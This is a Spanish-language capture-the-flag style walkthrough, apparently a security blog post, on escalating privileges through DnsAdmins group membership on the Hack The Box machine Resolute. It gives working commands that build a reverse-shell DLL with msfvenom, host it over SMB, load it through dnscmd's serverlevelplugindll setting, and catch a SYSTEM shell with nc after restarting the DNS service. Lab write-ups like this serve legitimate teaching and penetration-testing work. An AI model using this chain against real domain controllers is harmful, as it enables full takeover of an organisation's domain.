---
title: Active Directory - Abusando del Grupo DNSAdmins
description: El grupo DNSAdmins permite inyectar una DLL maliciosa que se ejecutará automáticamente al iniciar el servicio.
date: 2024-12-12
categories: [active-directory, dnsadmins]
tags: [grupos-de-usuarios-especiales, escalada-de-privilegios, casos-de-ataques-ad, dnscmd, dll, msfvenom, smbserver]
img_path: /assets/img/abusing-dnsadmins-injecting-dll.png
image: /assets/img/abusing-dnsadmins-injecting-dll.png
---

## **Introducción**

Ya hemos publicado varios artículos sobre Active Directory, pero aún quedan muchos más que se irán subiendo próximamente.

Los miembros del grupo *DnsAdmins* tienen acceso a la información *DNS* de la red. El servicio DNS de Windows admite complementos personalizados y puede llamar a funciones de estos para resolver consultas de nombres que no estén dentro del alcance de las zonas DNS locales. El servicio DNS se ejecuta como **`NT AUTHORITY\SYSTEM`**, por lo que la membresía en este grupo podría potencialmente aprovecharse para **escalar privilegios en un Controlador de Dominio** o en una situación donde un servidor separado actúe como servidor DNS del dominio. Es posible usar la utilidad integrada `dnscmd` para especificar la ruta del complemento DLL.

Para poder realizar este escenario, hemos usado la máquina [Resolute](https://app.hackthebox.com/machines/Resolute) de [Hack The Box](https://app.hackthebox.com/), cuya dirección IP es la *10.10.10.169* y el dominio correspondiente es *megabank.local*.

###  **Gráfico del escenario**

Para que podamos visualizarlo de una manera más sencilla, vamos a mostrar un gráfico representativo del escenario que vamos a realizar.

![abusando del grupo dnsadmins grafico representativo.png](/assets/img/abusando-del-grupo-dnsadmins-grafico-representativo.png)

### **Contexto**

Partiremos de la base en la que nos encontramos como el usuario *Ryan*. Este usuario, forma parte del grupo *Contractors* y este grupo a su vez, forma parte de *DnsAdmins*. Entonces, de forma indirecta, estamos dentro del grupo *DnsAdmins* y podemos realizar esta explotación.

## **Manos a la obra**
### **Identificando el grupo DnsAdmins**

Si miramos el grupo al que pertenecemos, observamos que estamos en el grupo *Contractors*.

```powershell
net user ryan
```

![net user ryan grupo contractors.png](/assets/img/net-user-ryan-grupo-contractors.png)

Sin embargo, al ejecutar el comando `whoami /all` aparece que formamos parte del grupo *DnsAdmins*.

```powershell
whoami /groups
```

![whoami groups vemos dnsadmins.png](/assets/img/whoami-groups-vemos-dnsadmins.png)

Esto se debe a que, el grupo *Contractors*, a su vez es miembro del grupo *DnsAdmins*. Esto lo podemos ver con `net localgroup DnsAdmins`.

```powershell
net localgroup DnsAdmins
```

![net localgroup dnsadmins vemos contractors.png](/assets/img/net-localgroup-dnsadmins-vemos-contractors.png)

Para verlo de una manera un poco más visual, podemos hacer uso de BloodHound. Este, nos muestra el "camino" que sigue nuestro usuario hasta llegar al grupo *DnsAdmin*.

![camino de ryan hasta llegar a dnsadmins.png](/assets/img/camino-de-ryan-hasta-llegar-a-dnsadmins.png)

Ser miembro de este grupo, supone una brecha de seguridad bastante grave sobre el *Domain Controler* ya que, tenemos el poder de inyectar una *DLL* maliciosa que se ejecutará al iniciar el servicio *DNS*. Como estamos dentro del grupo *DnsAdmins* tenemos los permisos necesarios como para parar y arrancar el servicio. A la hora del arranque, esta *DLL* que hemos configurado que se ejecute al inicio del mismo, se ejecutará y podremos realizar cualquier tipo de acción maliciosa como el usuario *Administrator*.

### **Abusando del grupo DnsAdmins**

Vamos a verlo de una manera más práctica. Primero, nos crearemos nuestra *DLL* maliciosa con `msfvenom` que se encargue de enviarnos una *Reverse Shell* a nuestra máquina por un puerto especificado. Los parámetros *LHOST* y *LPORT* pueden variar según el caso en el que nos encontremos y nuestras preferencias.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=NUESTRA-IP LPORT=PUERTO -f dll -o malicious.dll
```

![generando dll maliciosa.png](/assets/img/generando-dll-maliciosa.png)

A continuación, desde la máquina víctima estableceremos un nuevo archivo de configuración de una *DLL*. Esta *DLL* se cargará a través de un recurso compartido a nivel de red que, estaremos alojando en nuestra máquina de atacantes en el cual, estará esta *DLL* que hemos generado con `msfvenom`. Cuando la *DLL* se cargue, se ejecutará y nos enviará la consola a nuestra máquina de atacantes.

Como ya hemos comentado en el párrafo anterior, la *DLL* se cargará de un recurso compartido a nivel de red que estaremos alojando en nuestra máquina. Entonces, nos montaremos ese recurso compartido con `smbserver`.

```bash
smbserver.py smbFolder $(pwd) -smb2support
```

![recurso compartido con la dll.png](/assets/img/recurso-compartido-con-la-dll.png)

> Es **importante** tener en cuenta que si ejecutamos el comando anterior, el recurso compartido tendrá el nombre de *smbFolder* el cual, **se alojará en el directorio actual de trabajo**. Es en este directorio, en el que deberá de estar la *DLL* en cuestión.
{: .prompt-warning}

Para establecer el fichero de configuración *DLL*, usaremos [`dnscmd.exe`](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) de la siguiente manera.

```powershell
dnscmd.exe /config /serverlevelplugindll \\NUESTRA-IP\smbFolder\malicious.dll
```

En este punto, la *DLL* se cargará directamente desde el recurso compartido con nombre *smbFolder* que estará montado en nuestra máquina de atacantes y cuyo nombre de la *DLL* será `malicious.dll`.

### **Ganando acceso como Administrator**

Ahora, nos pondremos en escucha con `nc` por el puerto que le hemos indicado anteriormente a `msfvenom`. En este caso, el puerto en cuestión es el *443*.

```bash
rlwrap nc -nlvp PUERTO
```

![en escucha por el puerto 443 con rlwrap nc.png](/assets/img/en-escucha-por-el-puerto-443-con-rlwrap-nc.png)

Lo último que nos queda es *parar y arrancar el servicio DNS*. 

```powershell
sc.exe stop dns
sc.exe start dns
```

> Puede que el servicio lo tengamos que parar y arrancar **varias veces para que funcione** e incluso, tener que inyectar de nuevo la *DLL*.
{: .prompt-info}

Una vez arrancado el servicio, habremos obtenido una consola como el usuario administrador del dominio y acceso total al *DC*.

![obteniendo consola como administrador gracias a la dll maliciosa.png](/assets/img/obteniendo-consola-como-administrador-gracias-a-la-dll-maliciosa.png)

De esta manera, habremos comprometido el dominio habiéndonos convertido en el usuario con mayor privilegios.

## **Despedida**
Muchas gracias por dar una oportunidad a este artículo y espero que hayas adquirido un nuevo superpoder. Grupos de los que se pueden abusar a nivel de *Active Directory* son muchos, y es por ello que hay que tenerlos todos en cuenta.
